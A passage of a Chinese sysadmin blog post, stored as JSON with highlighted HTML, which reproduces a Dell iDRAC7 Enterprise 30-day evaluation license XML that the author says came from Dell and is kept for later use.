文件下载：iDRAC7_Ent_Trial.xml\n","permalink":"https://rendoumi.com/posts/20230406-dell_idrac/","summary":"\u003cp\u003e新公司的dell服务器idrac居然没有license，无法远程，找了dell要了一个临时license给装上，其实装好系统就不会太用到了，记录一下，以后备用。\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-xml\" data-lang=\"xml\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c\"\u003e\u0026lt;!--Copyright (c) 2010-2011 Dell Inc. All Rights Reserved.--\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e\u0026lt;lns:LicenseClass\u003c/span\u003e \u003cspan class=\"na\"\u003exmlns:ds=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;http://www.w3.org/2000/09/xmldsig#\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003exmlns:xsi=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003exmlns:lns=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;http://www.dell.com/2011/12G/licensing\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"nt\"\u003e\u0026lt;lns:LicenseData\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Schema\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Vendor=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Dell\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;iDRAC\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:maxDepth=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;255\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:SchemaVersion=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;2.0\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:TransferableLicense\u0026gt;\u003c/span\u003efalse\u003cspan class=\"nt\"\u003e\u0026lt;/lns:TransferableLicense\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:UTCdateSold\u0026gt;\u003c/span\u003e2011-09-20T16:10:37Z\u003cspan class=\"nt\"\u003e\u0026lt;/lns:UTCdateSold\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:EntitlementID\u0026gt;\u003c/span\u003e56r8irR7fV5w3MIxlJUFL9Ph_Lori_Matthews\u003cspan class=\"nt\"\u003e\u0026lt;/lns:EntitlementID\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:DeviceClass\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;iDRAC\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:ProductDescription\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"nt\"\u003e\u0026lt;lns:lang_en\u0026gt;\u003c/span\u003eiDRAC7 Enterprise Evaluation License\u003cspan class=\"nt\"\u003e\u0026lt;/lns:lang_en\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"nt\"\u003e\u0026lt;lns:lang_es\u0026gt;\u003c/span\u003eiDRAC7 Enterprise Evaluation License\u003cspan class=\"nt\"\u003e\u0026lt;/lns:lang_es\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"nt\"\u003e\u0026lt;lns:lang_fr\u0026gt;\u003c/span\u003eiDRAC7 Enterprise Evaluation License\u003cspan class=\"nt\"\u003e\u0026lt;/lns:lang_fr\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"nt\"\u003e\u0026lt;lns:lang_de\u0026gt;\u003c/span\u003eiDRAC7 Enterprise Evaluation License\u003cspan class=\"nt\"\u003e\u0026lt;/lns:lang_de\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"nt\"\u003e\u0026lt;lns:lang_it\u0026gt;\u003c/span\u003eiDRAC7 Enterprise Evaluation License\u003cspan class=\"nt\"\u003e\u0026lt;/lns:lang_it\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"nt\"\u003e\u0026lt;lns:lang_ja\u0026gt;\u003c/span\u003eiDRAC7 Enterprise Evaluation License\u003cspan class=\"nt\"\u003e\u0026lt;/lns:lang_ja\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"nt\"\u003e\u0026lt;lns:lang_zh\u0026gt;\u003c/span\u003eiDRAC7 Enterprise Evaluation License\u003cspan class=\"nt\"\u003e\u0026lt;/lns:lang_zh\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;/lns:ProductDescription\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:LicenseTerm\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"nt\"\u003e\u0026lt;lns:Evaluation\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Duration=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;P30D\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;/lns:LicenseTerm\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:DeviceInfo\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;1\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:VendorID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;0x1912\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:DeviceID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;0x0011\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;1\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;License Management\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;2\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;RACADM\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;3\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;WSMAN\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;4\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;SNMP\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;5\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Auto Discovery\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;6\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;USC Firmware Update\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;7\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Update Package\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;8\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;USC Operating System Deployment\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;9\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;USC Device Configuration\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;10\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;USC Diagnostics\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;11\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Power Budget\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;12\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Power Monitoring\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;13\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Virtual Media\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;14\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Telnet\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;15\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;SMASH CLP\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;16\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;IPv6\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;17\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Dynamic DNS\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;18\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Dedicated NIC\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;19\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Directory Services\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;20\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Two-Factor Authentication\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;21\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Single Sign-On\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;22\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;PK Authentication\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;23\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Crash Screen Capture\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;24\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Crash Video Capture\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;25\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Boot Capture\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;26\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Virtual Console\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;27\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Virtual Flash Partitions\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;28\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Console Collaboration\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;29\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Device Monitoring\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan 